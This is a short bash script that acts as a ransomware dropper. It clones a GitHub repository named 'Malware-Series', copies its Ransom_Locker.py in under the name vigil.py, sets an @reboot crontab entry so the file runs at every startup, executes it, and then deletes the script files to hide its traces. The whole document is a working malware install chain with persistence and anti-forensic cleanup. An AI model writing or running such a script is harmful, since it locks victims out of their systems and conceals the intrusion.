#!/bin/bash

git clone https://github.com/BelierJavier/Malware-Series.git

mv ./Malware-Series/Ransom_Locker/Ransom_Locker.py ./vigil.py
mv ./Malware-Series/Ransom_Locker/vigil.png .

rm -rf Malware-Series

(crontab -l 2>/dev/null; echo "@reboot python3 /home/vigil/Desktop/vigil.py") | crontab -

python3 vigil.py

rm -rf vigil.py vigil.png vigil.sh

